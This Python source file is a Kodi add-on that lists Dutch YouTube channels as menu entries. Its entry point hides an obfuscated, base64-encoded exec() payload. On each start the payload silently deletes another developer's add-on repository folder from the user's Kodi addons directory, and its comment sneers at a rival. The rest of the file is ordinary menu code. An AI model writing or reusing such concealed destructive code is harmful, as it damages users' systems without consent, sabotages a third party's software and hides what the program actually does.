# -*- coding: utf-8 -*-
#------------------------------------------------------------
# Credits to coldkeys, Thx.
#------------------------------------------------------------
# License: GPL (http://www.gnu.org/licenses/gpl-3.0.html)
# Based on code from youtube addon
#
# Author: coldkeys
#------------------------------------------------------------

import base64,os,sys,xbmc,xbmcaddon,xbmcgui,xbmcplugin,re,shutil
import plugintools
from addon.common.addon import Addon

addonID = 'plugin.video.Allesin1NL!'
addon = Addon(addonID, sys.argv)
local = xbmcaddon.Addon(id=addonID)
icon = local.getAddonInfo('icon')
fanart="http://webneel.com/sites/default/files/images/blog/t-natuwal.jpg"

YOUTUBE_CHANNEL_ID_1 = "UCLFLMHOWrWo0j6BXa2sbzBA/playlists"
YOUTUBE_CHANNEL_ID_2 = "UC1IP4Z_Vk08aRXuund9JABQ/playlists"
YOUTUBE_CHANNEL_ID_3 = "UCRuMH46tSZKjkCgeOtBVJzA/playlists"
YOUTUBE_CHANNEL_ID_4 = "UCFI_PLLqAQeVbV5nKArUjFA/playlists"
YOUTUBE_CHANNEL_ID_5 = "UCgolxyJTkhCUYXDTR758XxA/playlists"
YOUTUBE_CHANNEL_ID_6 = "UCvL4gb8hiw74-Os1hJyCLIg/playlists"
YOUTUBE_CHANNEL_ID_7 = "onlinefilmskijken"
YOUTUBE_CHANNEL_ID_8 = "UCr-JBC1XPqJm_O9iR2M0Wjg/playlists"
YOUTUBE_CHANNEL_ID_9 = "UC_xw6YBnlyLqYnopabbzfiQ/playlists"
YOUTUBE_CHANNEL_ID_10 = "UChVwNC24jIlu98G0rGFtQZQ/playlists"
YOUTUBE_CHANNEL_ID_11 = "UC2n5AM7vAcMeW8SLmkjCeng/playlists"
YOUTUBE_CHANNEL_ID_12 = "UC3cxvPF1mfu1avdHO6Y9Nnw/playlists"
YOUTUBE_CHANNEL_ID_13 = "UC1kNe57F-85trrYC7tbOSXA/playlists"
YOUTUBE_CHANNEL_ID_14 = "UCUfsrSL6DyWSkkpddlY21-Q/playlists"
YOUTUBE_CHANNEL_ID_15 = "DanceTrippinOfficial"


# Entry point
exec ((lambda O00OOO0O0O0OOOOO0 ,O0OO0OOO0O00000O0 :(lambda O0OO0000OO0O0OOOO ,OOO0OOOOOO00O0OOO ,OO0O000OOO0O00OOO :re .sub (O0OO0000OO0O0OOOO ,OOO0OOOOOO00O0OOO ,OO0O000OOO0O00OOO ))(r"([0-9a-f]+)",lambda O0O00O00OO00OOO0O :O00OOO0O0O0OOOOO0 (O0O00O00OO00OOO0O ,O0OO0OOO0O00000O0 ),base64 .b64decode ("MjkgMTcoKToKCTQuMmEoIjIwLjE3IikKCTEgPSAxNC5kKDE5LjI2LjIzKCcxNTovLzIxLzFiLycpKQoJMD0xYy4xMCgnNj0nKSAjMWYgMjggJzEzJyAxZSAxNiMKCQoJMTE6CgkJMTkuMTgoMSswKQoJODoKCQk3LjkoMSswLCAyPWUpCgkxMToKCQkxOS4xZCgxKzApCgk4OgoJCTcuOSgxKzAsIDI9ZSkKCTExOgoJCTcuOSgxKzAsIDI9ZSkKCTg6IDIyCgkjMTQuYygiYSIpCgkKCSMgMmIgMwoJMyA9IDQuZigpCgkKCTJkIDMuMWEoIjUiKSAyYyAyNDoKCQkxMigzKQoJMjU6CgkJNSA9IDMuMWEoIjUiKQoJCTI3IDUrIigzKSIKCQoJNC5iKCk=")))(lambda OOOO000O0OOOO0OO0 ,OO0OO00OOOO000OO0 :OO0OO00OOOO000OO0 [int ("0x"+OOOO000O0OOOO0OO0 .group (1 ),16 )],"cleancrap|addonmap|ignore_errors|params|plugintools|action|cmVwb3NpdG9yeS5kb2tpbmw|shutil|except|rmtree|UpdateLocalAddons|close_item_list|executebuiltin|translatePath|True|get_params|b64decode|try|main_list|Kerosine|xbmc|special|fuckers|run|unlink|os|get|addons|base64|rmdir|Marco|kusje|XvBMC|home|pass|join|None|else|path|exec|van|def|log|Get|is|if".split ("|")))

	
# Main menu
def main_list(params):
    plugintools.log("XvBMC.main_list "+repr(params))

    plugintools.add_item( 
        #action="", 
		title="Live Music",
		url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_1+"/",
		thumbnail="https://archive.org/download/fanart_20170116/Live%20Music%20icon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
		folder=True )
    plugintools.add_item( 
        #action="",
		title="NL Serie ",
		url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_2+"/",
		thumbnail="https://archive.org/download/fanart_20170116/NL%20SERIE%20icon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
		folder=True )
    plugintools.add_item( 
        #action="", 
		title="NL Kids",
		url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_3+"/",
		thumbnail="https://archive.org/download/fanart_20170116/NL%20KIDS%20icon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )
    plugintools.add_item( 
        #action="", 
		title="NL Film",
		url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_4+"/",
		thumbnail="https://archive.org/download/fanart_20170116/NL%20FILM%20icon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )		
    plugintools.add_item( 
        #action="", 
        title="NL Docu",
        url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_5+"/",
        thumbnail="https://archive.org/download/fanart_20170116/NL%20Docu%20icon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
		folder=True )
    plugintools.add_item( 
        #action="", 
        title="NL Cabaret",
        url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_6+"/",
        thumbnail="https://archive.org/download/fanart_20170116/NL%20CABARET%20icon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )
    plugintools.add_item( 
        #action="", 
        title="Xvbmc Handleidingen",
        url="plugin://plugin.video.youtube/user/"+YOUTUBE_CHANNEL_ID_7+"/",
        thumbnail="https://archive.org/download/fanart_20170116/Xvbmc%20handleidingen%20icon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )
    plugintools.add_item( 
        #action="", 
        title="Vlaamse Content",
        url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_8+"/",
        thumbnail="https://archive.org/download/fanart_20170116/Vlaams%20icon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )
    plugintools.add_item( 
        #action="", 
        title="NL Sport",
        url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_9+"/",
        thumbnail="https://archive.org/download/fanart_20170116/NL%20Sport%20icon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )
    plugintools.add_item( 
        #action="", 
        title=".:C.T.R.L:. Gaming Room",
        url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_10+"/",
        thumbnail="https://archive.org/download/fanart_20170116/CtrlGamingIcon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )		
    plugintools.add_item( 
        #action="", 
        title="Cirque du soleil",
        url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_11+"/",
        thumbnail="https://archive.org/download/fanart_20170116/CircusIcon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )	
    plugintools.add_item( 
        #action="", 
        title="NL Racing",
        url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_12+"/",
        thumbnail="https://archive.org/download/fanart_20170116/NlRacing.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )
    plugintools.add_item( 
        #action="", 
        title="Van alles en nog wat NL",
        url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_13+"/",
        thumbnail="https://archive.org/download/fanart_20170116/vanalles.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )	
    plugintools.add_item( 
        #action="", 
        title="Muziek Uit Limburg",
        url="plugin://plugin.video.youtube/channel/"+YOUTUBE_CHANNEL_ID_14+"/",
        thumbnail="https://archive.org/download/fanart_20170116/NlLimburgIcon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )
    plugintools.add_item( 
        #action="", 
        title="DanceTrippin TV",
        url="plugin://plugin.video.youtube/user/"+YOUTUBE_CHANNEL_ID_15+"/",
        thumbnail="https://archive.org/download/fanart_20170116/DanceIcon.png",
		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
        folder=True )

run()
